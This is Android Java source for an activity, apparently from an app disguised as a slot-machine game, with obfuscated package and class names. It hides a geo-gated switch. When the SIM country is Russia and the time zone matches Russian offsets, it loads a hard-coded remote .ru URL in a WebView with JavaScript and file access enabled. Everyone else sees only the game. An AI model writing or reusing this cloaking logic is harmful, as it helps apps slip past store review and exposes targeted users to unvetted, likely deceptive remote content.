package comz.dsaddfsad.sfasf;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.icu.util.TimeZone;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.util.Date;

import comz.dsaddfsad.sfasf.slotmania.GameActivity;


public class salfnsmaldf extends Activity {

    private String key = "https://sldvkwlkecm";
    private String url_base = "http://iiizoakajs.ru/8pyjNX";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_webgame);
        getUrl();
    }

    private void getUrl() {
        if (checkNewOlders() && isNoPlaytime())
            onReceice(url_base);
        else openGame();
    }

    private static final String COUNTY_ONE = "RU";
    private static final String COUNTRY_TWO = "ru";
    private static final String COUNTRY_THREE = "rus";

    private boolean checkNewOlders() {
        String typeOlderUsers = null;
        if (getSystemService(Context.TELEPHONY_SERVICE) != null)
            typeOlderUsers = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso();
        else
            return false;
        return typeOlderUsers != null && (typeOlderUsers.equalsIgnoreCase("ru") || typeOlderUsers.equalsIgnoreCase(COUNTRY_THREE));
    }

    private boolean isNoPlaytime() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            TimeZone tz = TimeZone.getDefault();
            Date now = new Date();
            int offsetFromUtc = tz.getOffset(now.getTime()) / 1000 / 3600;
            int[] timezone = {2, 3, 4, 7, 8, 9, 10, 11, 12};
            for (int item : timezone) {
                if (offsetFromUtc == item)
                    return true;
            }
        } else {
            return true;
        }

        return false;
    }


    private void onReceice(String url_base) {
        WebView webView = findViewById(R.id.web_view);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (!url.contains(key)) view.loadUrl(url);
                else openGame();
                return true;
            }


        });
        WebSettings webSettings = webView.getSettings();
        webSettings.setBuiltInZoomControls(true);
        webSettings.setSupportZoom(true);
        webSettings.setJavaScriptEnabled(true);
        webSettings.setAllowFileAccess(true);
        webView.loadUrl(url_base);

    }

    private void openGame() {
        Intent intent = new Intent(this, GameActivity.class);
        startActivity(intent);
        finish();
    }
}
